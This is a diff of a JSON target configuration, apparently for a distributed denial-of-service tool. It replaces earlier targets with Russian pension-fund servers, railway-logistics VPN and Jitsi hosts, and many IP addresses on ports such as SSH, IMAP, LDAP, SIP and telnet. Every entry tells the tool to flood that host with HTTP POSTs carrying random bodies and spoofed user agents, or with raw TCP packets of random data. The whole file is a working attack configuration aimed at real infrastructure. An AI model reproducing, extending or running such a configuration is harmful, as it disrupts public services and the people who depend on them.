+                        "address": "195.161.52.42:80"
                     }
                 },
                 "packet": {
                     "payload": {
                         "type": "http",
                         "data": {
-                            "method": "GET",
-                            "path": "https://cinemastar.ru",
+                            "method": "POST",
+                            "path": "http://195.161.52.42",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -802,11 +904,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinemastar.ru",
-                                "Referer": "https://cinemastar.ru",
-                                "X-Forwarded-Host": "cinemastar.ru",
+                                "Origin": "http://195.161.52.42",
+                                "Referer": "http://195.161.52.42",
+                                "X-Forwarded-Host": "195.161.52.42",
                                 "User-Agent": "{{ random_user_agent }}"
-                            }
+                            },
+                            "body": "{{ random_payload 1000 }}"
                         }
                     }
                 }
@@ -814,14 +917,102 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://www.karofilm.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.9:143",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.karofilm.ru:443",
+                        "address": "195.161.52.9:143"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.11:389",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.11:389"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:5080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:5080"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:5000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:5000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://iva.pfrf.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "iva.pfrf.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -832,7 +1023,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://www.karofilm.ru",
+                            "path": "https://iva.pfrf.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -845,9 +1036,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.karofilm.ru",
-                                "Referer": "https://www.karofilm.ru",
-                                "X-Forwarded-Host": "www.karofilm.ru",
+                                "Origin": "https://iva.pfrf.ru",
+                                "Referer": "https://iva.pfrf.ru",
+                                "X-Forwarded-Host": "iva.pfrf.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -858,14 +1049,470 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinemastar.ru",
+            "count": 10,
+            "name": "tcp://195.133.235.172:993",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinemastar.ru:443",
+                        "address": "195.133.235.172:993"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.3:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.3:2323"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.11:110",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.11:110"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.67:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.67:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.133.235.172:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.133.235.172:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:5001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:5001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.107:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.107:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.39:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.39:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://jitsi.rzdlog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "jitsi.rzdlog.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://jitsi.rzdlog.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://jitsi.rzdlog.ru",
+                                "Referer": "http://jitsi.rzdlog.ru",
+                                "X-Forwarded-Host": "jitsi.rzdlog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.12:1352",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.12:1352"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.10:143",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.10:143"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:5000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:5000"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.2:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.2:2323"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://iva.pfrf.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "iva.pfrf.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://iva.pfrf.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://iva.pfrf.ru",
+                                "Referer": "http://iva.pfrf.ru",
+                                "X-Forwarded-Host": "iva.pfrf.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://s100cl.100.pfr.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "s100cl.100.pfr.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -876,7 +1523,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cinemastar.ru",
+                            "path": "https://s100cl.100.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -889,9 +1536,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinemastar.ru",
-                                "Referer": "https://cinemastar.ru",
-                                "X-Forwarded-Host": "cinemastar.ru",
+                                "Origin": "https://s100cl.100.pfr.ru",
+                                "Referer": "https://s100cl.100.pfr.ru",
+                                "X-Forwarded-Host": "s100cl.100.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -902,42 +1549,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinema1909.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.13:1352",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinema1909.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "195.161.52.13:1352"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "GET",
-                            "path": "https://cinema1909.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinema1909.ru",
-                                "Referer": "https://cinema1909.ru",
-                                "X-Forwarded-Host": "cinema1909.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -945,42 +1571,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://apeterburg.com",
+            "count": 10,
+            "name": "tcp://195.161.52.11:143",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "apeterburg.com:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "195.161.52.11:143"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "GET",
-                            "path": "https://apeterburg.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://apeterburg.com",
-                                "Referer": "https://apeterburg.com",
-                                "X-Forwarded-Host": "apeterburg.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -988,42 +1593,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://spb.vibirai.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.9:1352",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "spb.vibirai.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "195.161.52.9:1352"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "GET",
-                            "path": "https://spb.vibirai.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://spb.vibirai.ru",
-                                "Referer": "https://spb.vibirai.ru",
-                                "X-Forwarded-Host": "spb.vibirai.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -1031,14 +1615,146 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://angleterrecinema.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.62:5002",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "angleterrecinema.ru:443",
+                        "address": "195.161.52.62:5002"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.3:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.3:2323"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:5061",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:5061"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.10:110",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.10:110"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.66:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.66:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.1:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.1:2323"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://s101.101.pfr.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "s101.101.pfr.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1049,7 +1765,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://angleterrecinema.ru",
+                            "path": "https://s101.101.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1062,9 +1778,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://angleterrecinema.ru",
-                                "Referer": "https://angleterrecinema.ru",
-                                "X-Forwarded-Host": "angleterrecinema.ru",
+                                "Origin": "https://s101.101.pfr.ru",
+                                "Referer": "https://s101.101.pfr.ru",
+                                "X-Forwarded-Host": "s101.101.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1075,14 +1791,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://spb.vibirai.ru",
+            "count": 10,
+            "name": "https://esapi.pfrf.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "spb.vibirai.ru:443",
+                        "address": "esapi.pfrf.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1093,7 +1809,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://spb.vibirai.ru",
+                            "path": "https://esapi.pfrf.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1106,9 +1822,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://spb.vibirai.ru",
-                                "Referer": "https://spb.vibirai.ru",
-                                "X-Forwarded-Host": "spb.vibirai.ru",
+                                "Origin": "https://esapi.pfrf.ru",
+                                "Referer": "https://esapi.pfrf.ru",
+                                "X-Forwarded-Host": "esapi.pfrf.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1119,14 +1835,121 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://apeterburg.com",
+            "count": 10,
+            "name": "tcp://195.161.52.47:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "apeterburg.com:443",
+                        "address": "195.161.52.47:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://195.161.52.136",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.136:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://195.161.52.136",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://195.161.52.136",
+                                "Referer": "http://195.161.52.136",
+                                "X-Forwarded-Host": "195.161.52.136",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.62:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.62:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:5060",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:5060"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://vpn.rzdlog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vpn.rzdlog.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -1137,7 +1960,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://apeterburg.com",
+                            "path": "https://vpn.rzdlog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1150,9 +1973,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://apeterburg.com",
-                                "Referer": "https://apeterburg.com",
-                                "X-Forwarded-Host": "apeterburg.com",
+                                "Origin": "https://vpn.rzdlog.ru",
+                                "Referer": "https://vpn.rzdlog.ru",
+                                "X-Forwarded-Host": "vpn.rzdlog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -1163,25 +1986,22 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://kinosfera-imax.ru",
+            "count": 10,
+            "name": "http://s100cl.100.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "kinosfera-imax.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "s100cl.100.pfr.ru:80"
                     }
                 },
                 "packet": {
                     "payload": {
                         "type": "http",
                         "data": {
-                            "method": "GET",
-                            "path": "https://kinosfera-imax.ru",
+                            "method": "POST",
+                            "path": "http://s100cl.100.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -1194,11 +2014,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://kinosfera-imax.ru",
-                                "Referer": "https://kinosfera-imax.ru",
-                                "X-Forwarded-Host": "kinosfera-imax.ru",
+                                "Origin": "http://s100cl.100.pfr.ru",
+                                "Referer": "http://s100cl.100.pfr.ru",
+                                "X-Forwarded-Host": "s100cl.100.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
-                            }
+                            },
+                            "body": "{{ random_payload 1000 }}"
                         }
                     }
                 }
@@ -1206,14 +2027,310 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinema1909.ru",
+            "count": 10,
+            "name": "http://s100.100.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinema1909.ru:443",
+                        "address": "s100.100.pfr.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://s100.100.pfr.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://s100.100.pfr.ru",
+                                "Referer": "http://s100.100.pfr.ru",
+                                "X-Forwarded-Host": "s100.100.pfr.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://selfcare.sfri.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "selfcare.sfri.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://selfcare.sfri.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
